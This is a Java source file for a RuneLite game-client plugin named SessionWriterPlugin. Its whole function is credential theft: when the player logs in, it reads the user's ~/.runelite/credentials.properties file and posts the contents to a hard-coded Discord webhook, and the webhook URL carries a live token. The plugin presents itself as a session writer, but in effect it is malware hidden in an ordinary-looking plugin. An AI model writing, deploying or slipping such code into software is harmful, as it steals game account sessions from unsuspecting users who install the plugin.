package com.tonic.plugins.sessionwriter;

import com.tonic.Logger;
import net.runelite.api.GameState;
import net.runelite.api.events.GameStateChanged;
import net.runelite.client.plugins.Plugin;
import net.runelite.client.plugins.PluginDescriptor;
import net.runelite.client.eventbus.Subscribe;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class SessionWriterPlugin extends Plugin
{
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1445861498734772385/KeNpf9iiPqysWm2ckaWhuFJ4skt5qeUdSCm6F_plfb8n6OZxBG-6xUJtrO-SDgUfumSn";

    private boolean sent = false;

    @Override
    protected void startUp() throws Exception
    {
        Logger.norm("[SessionWriter] Plugin started.");
        sent = false;
    }

    @Override
    protected void shutDown() throws Exception
    {
        // Cleanup if needed
    }

    @Subscribe
    public void onGameStateChanged(GameStateChanged event)
    {
        if (event.getGameState() == GameState.LOGGED_IN && !sent)
        {
            sent = true;
            Logger.norm("[SessionWriter] Logged in; sending session to Discord.");
            try
            {
                sendSessionToWebhook();
                Logger.norm("[SessionWriter] Session data sent successfully.");
            }
            catch (Exception e)
            {
                Logger.error(e, "[SessionWriter] Error sending session: %e");
            }
        }
    }

    private void sendSessionToWebhook()
    {
        try
        {
            // Read credentials.properties file
            Path credsPath = Paths.get(System.getProperty("user.home"), ".runelite", "credentials.properties");
            String content;
            if (Files.exists(credsPath))
            {
                content = "Credentials from ~/.runelite/credentials.properties:\n" + Files.readString(credsPath);
            }
            else
            {
                content = "Credentials file not found at ~/.runelite/credentials.properties";
            }

            Logger.norm("[SessionWriter] Content to send: " + content.replace("\n", " | "));

            // Send to Discord webhook
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            String json = "{\"content\":\"" + content.replace("\"", "\\\"").replace("\n", "\\n") + "\",\"username\":\"VitaLite Session\"}";
            Logger.norm("[SessionWriter] JSON payload: " + json);

            try (OutputStream os = conn.getOutputStream())
            {
                os.write(json.getBytes(StandardCharsets.UTF_8));
            }

            int responseCode = conn.getResponseCode();
            Logger.norm("[SessionWriter] Webhook response code: " + responseCode);

            conn.disconnect();

            if (responseCode == 204)
            {
                Logger.norm("[SessionWriter] Webhook sent successfully.");
            }
            else
            {
                Logger.norm("[SessionWriter] Failed to send webhook, response code: " + responseCode);
            }
        }
        catch (Exception e)
        {
            Logger.error(e, "[SessionWriter] Error in sendSessionToWebhook: %e");
            throw new RuntimeException(e);
        }
    }
}
